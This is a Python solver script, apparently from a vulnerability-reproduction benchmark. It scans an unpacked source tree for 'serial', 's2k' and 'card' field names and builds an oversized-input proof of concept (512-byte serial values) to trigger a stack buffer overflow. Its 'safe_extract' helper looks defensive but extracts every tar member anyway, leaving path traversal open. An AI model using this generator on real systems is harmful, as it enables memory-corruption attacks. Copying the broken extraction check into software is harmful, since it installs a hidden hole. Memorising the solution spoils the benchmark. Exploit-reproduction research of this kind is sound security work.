import os
import tarfile
import tempfile
import re
from typing import List, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            root = self._extract(src_path)
            candidates = self._extract_candidate_prefixes(root)
            if not candidates:
                candidates = self._default_candidates()
            # Deduplicate while preserving order
            seen = set()
            uniq = []
            for c in candidates:
                k = c.lower()
                if k not in seen:
                    seen.add(k)
                    uniq.append(c)
            return self._build_input(uniq)
        except Exception:
            # Fallback: generic crafted input with many likely fields
            return self._build_input(self._default_candidates())

    def _extract(self, tar_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="arvotmp_")
        with tarfile.open(tar_path, 'r:*') as tf:
            def is_within_directory(directory, target):
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                prefix = os.path.commonprefix([abs_directory, abs_target])
                return prefix == abs_directory
            def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                for member in tar.getmembers():
                    member_path = os.path.join(path, member.name)
                    if not is_within_directory(path, member_path):
                        continue
                tar.extractall(path, members, numeric_owner=numeric_owner)
            safe_extract(tf, tmpdir)
        return tmpdir

    def _read_file_safe(self, path: str) -> str:
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        except Exception:
            return ""

    def _extract_string_literals(self, text: str) -> List[str]:
        # Extract C/C++/JSON/Python-like double-quoted string literals
        res = []
        # Match "...." with escapes
        for m in re.finditer(r'"([^"\\]*(?:\\.[^"\\]*)*)"', text, re.DOTALL):
            s = m.group(1)
            # Unescape simple C-style escapes
            s = s.replace(r'\"', '"').replace(r'\\', '\\')
            s = s.replace(r'\n', '\n').replace(r'\r', '\r').replace(r'\t', '\t')
            res.append(s)
        return res

    def _extract_candidate_prefixes(self, root: str) -> List[str]:
        exts = {'.c', '.cc', '.cpp', '.hpp', '.h', '.hh', '.txt', '.md', '.rst', '.json', '.yaml', '.yml', '.py', '.go', '.rs'}
        candidates: List[Tuple[int, str]] = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                p = os.path.join(dirpath, fn)
                text = self._read_file_safe(p)
                if not text:
                    continue
                lits = self._extract_string_literals(text)
                # Also include bare words from code
                words = re.findall(r'[A-Za-z0-9_\-:./]{3,}', text)
                all_tokens = lits + words
                for s in all_tokens:
                    sl = s.lower()
                    score = 0
                    if 's2k' in sl:
                        score += 5
                    if 'card' in sl:
                        score += 4
                    if 'serial' in sl or 'serialno' in sl or 'serial-num' in sl:
                        score += 6
                    if score == 0:
                        continue
                    # Look for potential field/prefix-like tokens
                    if any(ch in s for ch in (':', '=', ' ')):
                        # Trim to something resembling a key/prefix
                        # Prefer tokens with 'serial' inside
                        if 'serial' in sl or 'serialno' in sl:
                            # Keep up to first occurrence of possible delimiter
                            for delim in [':', '=', ' ']:
                                idx = s.lower().find('serial')
                                if idx >= 0:
                                    # expand to previous delimiter if exists
                                    # find token start
                                    start = max(0, s.rfind(' ', 0, idx) + 1)
                                    chunk = s[start:]
                                    # cut at newline if present
                                    chunk = chunk.splitlines()[0]
                                    # if contains delimiter, cut to include delimiter
                                    # we want 'prefix:' shape if present
                                    m = re.search(r'[:=]\s*$', chunk)
                                    # If not end with delimiter, try to keep up to delimiter
                                    # else keep key + delimiter
                                    # Simplify: just build a key with common delimiters
                                    # Extract wordish key around 'serial'
                                    keym = re.search(r'([A-Za-z0-9_\-]*serial[A-Za-z0-9_\-]*)', chunk, re.IGNORECASE)
                                    if keym:
                                        key = keym.group(1)
                                        # Build normalized prefixes
                                        for sep in [":", "="]:
                                            pref = f"{key}{sep}"
                                            candidates.append((score + 10, pref))
                                    break
                        else:
                            # Not serial specifically; but 's2k' or 'card' tokens can help
                            # Build combined keys heuristically
                            key = re.sub(r'[^A-Za-z0-9_\-]', '', s.strip())
                            if key:
                                for sep in [":", "="]:
                                    candidates.append((score, f"{key}{sep}"))
                    else:
                        # Pure tokens; we can compose them
                        token = re.sub(r'[^A-Za-z0-9_\-]', '', s.strip())
                        if token:
                            candidates.append((1, token))
        # Add handcrafted composite prefixes if ingredients exist
        has_s2k = any('s2k' in c[1].lower() for c in candidates)
        has_card = any('card' in c[1].lower() for c in candidates)
        has_serial = any('serial' in c[1].lower() for c in candidates)
        composites = []
        if has_serial:
            composites.extend([
                'serial:', 'serial=', 'serialno:', 'serialno=', 'serial-number:', 'serial-number=',
                'serial_num:', 'serial_num=', 'serial_no:', 'serial_no='
            ])
        if has_card and has_serial:
            composites.extend([
                'card-serial:', 'card-serial=',
                'card_serial:', 'card_serial=',
                'card-serialno:', 'card-serialno=',
                'card_serialno:', 'card_serialno=',
                'cardserial:', 'cardserial=', 'cardserialno:', 'cardserialno='
            ])
        if has_s2k and has_serial:
            composites.extend([
                's2k-serial:', 's2k-serial=', 's2k_serial:', 's2k_serial=',
            ])
        if has_s2k and has_card and has_serial:
            composites.extend([
                's2k-card-serial:', 's2k-card-serial=',
                's2k_card_serial:', 's2k_card_serial=',
                's2k-card-serialno:', 's2k-card-serialno=',
                's2k_card_serialno:', 's2k_card_serialno=',
            ])
        for comp in composites:
            candidates.append((20, comp))

        # Sort by score descending, then by length ascending (short keys first)
        candidates.sort(key=lambda x: (-x[0], len(x[1])))
        # Keep top unique prefixes
        prefixes = []
        seen = set()
        for _, pref in candidates:
            pl = pref.lower()
            if pl not in seen and any(k in pl for k in ['serial', 's2k', 'card']):
                seen.add(pl)
                prefixes.append(pref)
            if len(prefixes) >= 20:
                break
        return prefixes

    def _default_candidates(self) -> List[str]:
        # General likely field names relevant to the vulnerability
        return [
            's2k-card-serial:',
            's2k_card_serial:',
            's2k-serial:',
            's2k_serial:',
            'card-serial:',
            'card_serial:',
            'serialno:',
            'serial:',
            's2k-card-serial=',
            's2k_card_serial=',
            's2k-serial=',
            's2k_serial=',
            'card-serial=',
            'card_serial=',
            'serialno=',
            'serial=',
        ]

    def _build_input(self, prefixes: List[str]) -> bytes:
        # Build a multi-line input trying multiple likely prefixes.
        # Use a sufficiently long serial number to trigger overflow in vulnerable versions.
        long_serial = 'A' * 512
        # Also include a borderline length around typical small stack buffers (e.g., 32/64)
        mid_serial = 'B' * 80
        short_serial = 'C' * 20

        lines: List[str] = []

        # First line: Most likely trigger with full long serial
        primary = None
        for p in prefixes:
            if 'serial' in p.lower() and ('s2k' in p.lower() or 'card' in p.lower()):
                primary = p
                break
        if not primary and prefixes:
            primary = prefixes[0]
        if primary is None:
            primary = 's2k-card-serial:'
        lines.append(f"{primary}{long_serial}")

        # Add variations with other prefixes
        for i, p in enumerate(prefixes):
            if i == 0 and p == primary:
                continue
            # Alternate lengths to traverse different parsing branches if any
            value = long_serial if i % 3 == 0 else (mid_serial if i % 3 == 1 else short_serial)
            lines.append(f"{p}{value}")

        # Add some generic stand-alone long tokens that might be treated as serial directly
        lines.append(long_serial)
        lines.append(f"S2K:{mid_serial}")
        lines.append(f"CARD:{mid_serial}")
        lines.append(f"SERIAL:{mid_serial}")

        data = "\n".join(lines) + "\n"
        return data.encode('utf-8')